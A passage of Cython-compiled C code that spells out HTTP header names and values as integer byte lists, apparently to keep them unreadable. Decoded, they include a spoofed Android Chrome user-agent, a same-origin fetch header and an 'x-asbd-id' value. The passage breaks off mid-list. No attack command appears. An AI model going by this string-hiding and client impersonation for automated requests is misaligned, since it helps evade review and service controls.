  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_101);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(11); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_110);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_116);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(119); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_77);
  __Pyx_GIVEREF(__pyx_int_77);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_77);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_122);
  __Pyx_GIVEREF(__pyx_int_122);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_122);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_40);
  __Pyx_GIVEREF(__pyx_int_40);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_40);
  __Pyx_INCREF(__pyx_int_76);
  __Pyx_GIVEREF(__pyx_int_76);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_76);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_2, 16, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_2, 17, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_59);
  __Pyx_GIVEREF(__pyx_int_59);
  PyList_SET_ITEM(__pyx_t_2, 18, __pyx_int_59);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 19, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_65);
  __Pyx_GIVEREF(__pyx_int_65);
  PyList_SET_ITEM(__pyx_t_2, 20, __pyx_int_65);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 21, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 22, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 23, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 24, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 25, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 26, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 27, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_2, 28, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_2, 29, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_59);
  __Pyx_GIVEREF(__pyx_int_59);
  PyList_SET_ITEM(__pyx_t_2, 30, __pyx_int_59);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 31, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_77);
  __Pyx_GIVEREF(__pyx_int_77);
  PyList_SET_ITEM(__pyx_t_2, 32, __pyx_int_77);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_2, 33, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_2, 34, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_2, 35, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_2, 36, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_75);
  __Pyx_GIVEREF(__pyx_int_75);
  PyList_SET_ITEM(__pyx_t_2, 37, __pyx_int_75);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_2, 38, __pyx_int_55);
  __Pyx_INCREF(__pyx_int_56);
  __Pyx_GIVEREF(__pyx_int_56);
  PyList_SET_ITEM(__pyx_t_2, 39, __pyx_int_56);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_2, 40, __pyx_int_54);
  __Pyx_INCREF(__pyx_int_41);
  __Pyx_GIVEREF(__pyx_int_41);
  PyList_SET_ITEM(__pyx_t_2, 41, __pyx_int_41);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 42, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_65);
  __Pyx_GIVEREF(__pyx_int_65);
  PyList_SET_ITEM(__pyx_t_2, 43, __pyx_int_65);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 44, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 45, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 46, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 47, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_87);
  __Pyx_GIVEREF(__pyx_int_87);
  PyList_SET_ITEM(__pyx_t_2, 48, __pyx_int_87);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 49, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_2, 50, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_75);
  __Pyx_GIVEREF(__pyx_int_75);
  PyList_SET_ITEM(__pyx_t_2, 51, __pyx_int_75);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 52, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 53, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 54, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_2, 55, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_51);
  __Pyx_GIVEREF(__pyx_int_51);
  PyList_SET_ITEM(__pyx_t_2, 56, __pyx_int_51);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_2, 57, __pyx_int_55);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 58, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_51);
  __Pyx_GIVEREF(__pyx_int_51);
  PyList_SET_ITEM(__pyx_t_2, 59, __pyx_int_51);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_2, 60, __pyx_int_54);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 61, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_40);
  __Pyx_GIVEREF(__pyx_int_40);
  PyList_SET_ITEM(__pyx_t_2, 62, __pyx_int_40);
  __Pyx_INCREF(__pyx_int_75);
  __Pyx_GIVEREF(__pyx_int_75);
  PyList_SET_ITEM(__pyx_t_2, 63, __pyx_int_75);
  __Pyx_INCREF(__pyx_int_72);
  __Pyx_GIVEREF(__pyx_int_72);
  PyList_SET_ITEM(__pyx_t_2, 64, __pyx_int_72);
  __Pyx_INCREF(__pyx_int_84);
  __Pyx_GIVEREF(__pyx_int_84);
  PyList_SET_ITEM(__pyx_t_2, 65, __pyx_int_84);
  __Pyx_INCREF(__pyx_int_77);
  __Pyx_GIVEREF(__pyx_int_77);
  PyList_SET_ITEM(__pyx_t_2, 66, __pyx_int_77);
  __Pyx_INCREF(__pyx_int_76);
  __Pyx_GIVEREF(__pyx_int_76);
  PyList_SET_ITEM(__pyx_t_2, 67, __pyx_int_76);
  __Pyx_INCREF(__pyx_int_44);
  __Pyx_GIVEREF(__pyx_int_44);
  PyList_SET_ITEM(__pyx_t_2, 68, __pyx_int_44);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 69, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 70, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 71, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_107);
  __Pyx_GIVEREF(__pyx_int_107);
  PyList_SET_ITEM(__pyx_t_2, 72, __pyx_int_107);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 73, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 74, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_71);
  __Pyx_GIVEREF(__pyx_int_71);
  PyList_SET_ITEM(__pyx_t_2, 75, __pyx_int_71);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 76, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 77, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_107);
  __Pyx_GIVEREF(__pyx_int_107);
  PyList_SET_ITEM(__pyx_t_2, 78, __pyx_int_107);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 79, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_41);
  __Pyx_GIVEREF(__pyx_int_41);
  PyList_SET_ITEM(__pyx_t_2, 80, __pyx_int_41);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 81, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_67);
  __Pyx_GIVEREF(__pyx_int_67);
  PyList_SET_ITEM(__pyx_t_2, 82, __pyx_int_67);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 83, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 84, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 85, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 86, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 87, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 88, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_2, 89, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_2, 90, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_52);
  __Pyx_GIVEREF(__pyx_int_52);
  PyList_SET_ITEM(__pyx_t_2, 91, __pyx_int_52);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 92, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_2, 93, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 94, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_2, 95, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 96, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_2, 97, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 98, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_77);
  __Pyx_GIVEREF(__pyx_int_77);
  PyList_SET_ITEM(__pyx_t_2, 99, __pyx_int_77);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 100, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_2, 101, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 102, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 103, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 104, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 105, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_83);
  __Pyx_GIVEREF(__pyx_int_83);
  PyList_SET_ITEM(__pyx_t_2, 106, __pyx_int_83);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 107, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_2, 108, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 109, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 110, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 111, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 112, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_2, 113, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_51);
  __Pyx_GIVEREF(__pyx_int_51);
  PyList_SET_ITEM(__pyx_t_2, 114, __pyx_int_51);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_2, 115, __pyx_int_55);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 116, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_51);
  __Pyx_GIVEREF(__pyx_int_51);
  PyList_SET_ITEM(__pyx_t_2, 117, __pyx_int_51);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_2, 118, __pyx_int_54);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_100);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_57);
  __Pyx_GIVEREF(__pyx_int_57);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_57);
  __Pyx_INCREF(__pyx_int_52);
  __Pyx_GIVEREF(__pyx_int_52);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_52);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_55);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
